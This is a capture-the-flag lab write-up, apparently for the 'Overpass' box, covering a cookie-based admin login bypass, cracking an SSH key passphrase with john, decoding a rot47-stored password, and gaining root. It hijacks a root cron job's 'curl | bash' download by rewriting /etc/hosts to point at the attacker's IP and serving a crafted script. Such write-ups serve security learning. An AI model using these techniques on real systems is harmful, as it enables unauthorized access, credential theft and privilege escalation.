1. Look into `login.js` at `/admin` page, it shows if our cookie `SessionToken` is not "Incorrect credentials", then we will login as admin.
```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
2. After login, we get James's private key with passphrase. We can use `john` to crack it.
```bash
$ /opt/john/run/john james.john --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt > pass.john
Using default input encoding: UTF-8
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 4 needed for performance.
1g 0:00:00:05 DONE (2021-06-17 17:49) 0.1801g/s 2584Kp/s 2584Kc/s 2584KC/s *7¡Vamos!
Session completed
```
3. Under James's home directory, we can find `.overpass` file, where Overpass store the passwords. Decrypted it with rot47, we get James's password.
```bash
james@overpass-prod:~$ cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.

# rot47 => [{"name":"System","pass":"saydrawnlyingpicture"}]
```
4. Run LinPEAS, we see two interesting things: root is always executing the shell script download from overpass.thm, and, /etc/hosts is writable.
```bash
$ sh linpeas.sh
...
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

$ ls -l /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```
5. Change `overpass.thm` to be our ip, then execute as root!
```bash
$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
# 127.0.0.1 overpass.thm
10.9.1.235 overpass.thm

$ echo 'cat /root/root.txt > /tmp/a;chmod 777 /tmp/a' > downloads/src/buildscript.sh; python3 -m http.server 80
...
